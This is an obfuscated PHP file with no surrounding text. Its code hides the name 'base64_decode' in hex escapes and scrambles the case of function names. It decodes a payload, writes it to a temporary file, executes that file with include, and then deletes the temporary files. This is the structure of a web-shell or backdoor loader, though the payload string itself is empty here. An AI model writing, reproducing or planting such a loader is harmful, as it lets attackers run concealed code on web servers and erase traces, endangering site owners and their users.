<?=@null;$_____ = "";$_b = "\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65";fuNcTiOn ____($_____) {	$_a = sYs_gEt_TeMp_dIr();    $tmpfname = TeMpNaM($_a, "\x75\x6E\x69\x78\x2E\x31\x31");    $handle = fOpEn($tmpfname, "w+");    fWrItE($handle, "\x3C\x3F\x70\x68\x70\n" . $_____);    FcLoSe($handle);    iNcLuDe $tmpfname;    array_map('unlink', glob($_a . "/*.11*"));    rEtUrN get_defined_vars();}eXtRaCt(____($_b($_____)));